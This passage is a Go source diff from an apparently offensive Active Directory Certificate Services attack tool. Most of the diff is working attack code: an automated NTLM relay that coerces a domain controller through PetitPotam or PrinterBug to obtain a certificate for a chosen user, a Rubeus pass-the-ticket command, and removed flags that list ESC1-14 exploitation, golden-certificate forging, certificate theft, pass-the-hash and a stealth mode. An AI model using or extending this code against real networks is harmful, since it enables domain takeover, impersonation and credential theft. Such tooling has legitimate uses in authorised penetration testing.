-		return fmt.Errorf("ldap connect: %w", err)
-	}
-	defer conn.Close()
-
-	vulnerable, err := pki.AutoDetectESC(ctx, cfg, conn)
-	if err != nil {
-		return fmt.Errorf("auto-detect: %w", err)
-	}
-
-	if cfg.OutputJSON {
-		data, _ := json.MarshalIndent(vulnerable, "", "  ")
-		fmt.Println(string(data))
-		return nil
-	}
-
-	if len(vulnerable) == 0 {
-		fmt.Println("[*] No vulnerable templates detected.")
-		return nil
-	}
-
-	fmt.Printf("\n[+] Found %d vulnerable template(s) — prioritized attack paths:\n\n", len(vulnerable))
-	for i, t := range vulnerable {
-		fmt.Printf("  %d. [Score: %d] %s\n", i+1, t.ESCScore, t.Name)
-		fmt.Printf("     Vulnerabilities: %s\n", strings.Join(t.ESCVulns, ", "))
-		if t.EnrolleeSuppliesSubject {
-			fmt.Println("     → Enrollee can supply subject (critical for impersonation)")
-		}
-		if t.AuthenticationEKU {
-			fmt.Println("     → Has authentication EKU (can be used for domain auth)")
-		}
-		fmt.Println()
+		fmt.Printf("    KRB5CCNAME=admin.ccache Rubeus.exe asktgt /user:%s /certificate:%s /ptt\n", sam, pfxPath)
 	}
 	return nil
 }
@@ -967,10 +955,10 @@ func runImportPFX(cmd *cobra.Command, pfxPath string) error {
 func runReport(cmd *cobra.Command) error {
 	cfg := buildADCSConfig(cmd)
 	if cfg.TargetDC == "" || cfg.Domain == "" {
-		return fmt.Errorf("--target-dc and --domain are required for report generation")
+		return fmt.Errorf("-dc and -d are required for report generation")
 	}
 	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
-		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
+		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
 	}
 	ctx := context.Background()
 	conn, err := pki.ConnectLDAP(ctx, cfg)
@@ -1011,97 +999,39 @@ func runReport(cmd *cobra.Command) error {
 	return nil
 }
 
-func init() {
-	rootCmd.AddCommand(pkiCmd)
-
-	// Action flags
-	pkiCmd.Flags().Bool("enum", false, "Enumerate ADCS certificate templates")
-	pkiCmd.Flags().Bool("forge", false, "Forge a golden certificate")
-	pkiCmd.Flags().String("esc", "", "Exploit ESC vulnerability (1-14, e.g. --esc 1)")
-	pkiCmd.Flags().String("exploit", "", "Alias for --esc")
-	pkiCmd.Flags().MarkHidden("exploit")
-	pkiCmd.Flags().Bool("auto-detect", false, "Auto-detect ESC vulnerabilities and prioritize attack paths")
-	pkiCmd.Flags().String("import-pfx", "", "Import and display info from a PKCS12/PFX file")
-	pkiCmd.Flags().Bool("report", false, "Generate engagement report from full ADCS enumeration")
-	pkiCmd.Flags().String("theft", "", "Certificate theft playbook (1-5 or all)")
-	pkiCmd.Flags().String("cert-theft", "", "Alias for --theft")
-	pkiCmd.Flags().MarkHidden("cert-theft")
-
-	// Connection flags
-	pkiCmd.Flags().String("target-dc", "", "Target domain controller hostname")
-	pkiCmd.Flags().String("domain", "", "Active Directory domain name")
-	pkiCmd.Flags().StringP("username", "u", "", "Domain username (user or user@domain)")
-	pkiCmd.Flags().StringP("password", "p", "", "Domain password for LDAP authentication")
-	pkiCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash authentication")
-	pkiCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication (GSSAPI/SPNEGO)")
-	pkiCmd.Flags().String("ccache", "", "Path to Kerberos ccache file (default: KRB5CCNAME env)")
-	pkiCmd.Flags().String("keytab", "", "Path to Kerberos keytab file")
-	pkiCmd.Flags().String("dc-ip", "", "KDC IP address (if different from --target-dc)")
-	pkiCmd.Flags().Bool("ldaps", false, "Use LDAPS (port 636)")
-	pkiCmd.Flags().Bool("start-tls", false, "Use StartTLS (upgrade plaintext LDAP to TLS)")
-
-	// Certificate flags
-	pkiCmd.Flags().String("upn", "", "User Principal Name for certificate forging")
-	pkiCmd.Flags().String("ca-key", "", "Path to CA private key PEM file")
-	pkiCmd.Flags().String("ca-cert", "", "Path to CA certificate PEM file (with --ca-key, enables golden certificate mode)")
-	pkiCmd.Flags().String("template", "", "Certificate template name for exploitation")
-	pkiCmd.Flags().String("pfx-password", "", "Password for PFX archive (default: empty/unencrypted)")
-	pkiCmd.Flags().String("ca", "", "Target CA name for ESC7 exploitation")
-	pkiCmd.Flags().String("attacker-dn", "", "Attacker sAMAccountName or LDAP DN for ESC9 (e.g., 'attacker' — DN auto-built from --domain)")
-	pkiCmd.Flags().String("listener-ip", "", "Attacker relay listener IP for ESC8/ESC11 (triggers PetitPotam coercion)")
-	pkiCmd.Flags().Int("listener-port", 0, "Relay listener port (>1024 for non-admin pivot; uses WebDAV/HTTP instead of SMB)")
-	pkiCmd.Flags().Int("relay-port", 8080, "Local port for built-in NTLM relay server (ESC8)")
-	pkiCmd.Flags().Int("relay-timeout", 120, "Seconds to wait for NTLM relay connection (ESC8)")
-	pkiCmd.Flags().String("victim-dn", "", "Target user LDAP DN for ESC14 explicit mapping")
-
-	// Output flags
-	pkiCmd.Flags().StringP("output", "o", "", "Output file path")
-	pkiCmd.Flags().Bool("json", false, "Output results as JSON instead of human-readable text")
-	pkiCmd.Flags().String("format", "markdown", "Report format (markdown)")
-
-	// Operational flags
-	pkiCmd.Flags().Bool("stealth", false, "Enable stealth mode: random delays between queries, smaller page sizes")
-	pkiCmd.Flags().Int("timeout", 10, "Network timeout in seconds for LDAP/HTTP/RPC connections")
-}
-
-func runAutomatedRelay(cfg *pki.ADCSConfig, targetURL, caName, templateName, listenerIP string, listenerPort int) error {
-	fmt.Printf("[*] Starting automated relay: certipy-ad relay -target %s -ca %q -template %s\n", targetURL, caName, templateName)
-	cmd := exec.Command("certipy-ad", "relay", "-target", targetURL, "-ca", caName, "-template", templateName)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	
-	if err := cmd.Start(); err != nil {
-		return fmt.Errorf("failed to start certipy-ad (is it installed in PATH?): %w", err)
+func runAutomatedRelay(cfg *pki.ADCSConfig, caHostname, caName, templateName, upn, listenerIP string, listenerPort, relayPort int, relayTimeout time.Duration) (*x509.Certificate, crypto.Signer, error) {
+	if relayPort == 0 {
+		relayPort = 8080
 	}
-	
-	defer func() {
-		if cmd.Process != nil {
-			cmd.Process.Kill()
-		}
-	}()
-	
-	time.Sleep(3 * time.Second)
-	
-	fmt.Printf("\n[*] Triggering coercion: %s → %s:%d\n", cfg.TargetDC, listenerIP, listenerPort)
-	if err := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam, cfg); err != nil {
-		fmt.Printf("[!] PetitPotam failed: %v\n", err)
-		if err2 := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePrinterBug, cfg); err2 != nil {
-			fmt.Printf("[!] PrinterBug also failed: %v\n", err2)
-		}
+	if relayTimeout == 0 {
+		relayTimeout = 120 * time.Second
 	}
-	
-	fmt.Println("\n[*] Waiting up to 15 seconds for relay to complete...")
-	done := make(chan error, 1)
+
+	fmt.Printf("[*] Starting native SMB NTLM relay on :%d → %s (CA: %s)\n", relayPort, caHostname, caName)
+
+	listenerIPForCoerce := listenerIP
+	if listenerIPForCoerce == "" {
+		listenerIPForCoerce = "127.0.0.1"
+	}
+
 	go func() {
-		done <- cmd.Wait()
+		time.Sleep(2 * time.Second)
+		fmt.Printf("[*] Triggering coercion: %s → %s:%d\n", cfg.TargetDC, listenerIPForCoerce, listenerPort)
+		if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIPForCoerce, listenerPort, pki.CoercePetitPotam, cfg); coerceErr != nil {
+			fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
+			if err2 := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIPForCoerce, listenerPort, pki.CoercePrinterBug, cfg); err2 != nil {
+				fmt.Printf("[!] PrinterBug also failed: %v\n", err2)
+			}
+		}
 	}()
-	
-	select {
-	case <-done:
-		fmt.Println("[+] Relay process exited.")
-	case <-time.After(15 * time.Second):
-		fmt.Println("[*] Stopping relay process (timeout)...")
-		cmd.Process.Kill()
+
+	cert, key, err := pki.RunSMBRelay(caHostname, caName, templateName, upn, relayPort, relayTimeout)
+	if err != nil {
+		return nil, nil, fmt.Errorf("SMB relay failed: %w", err)
 	}
-	return nil
+
+	fmt.Printf("[+] Relay: Certificate obtained for %s\n", upn)
+	return cert, key, nil
 }
+
+
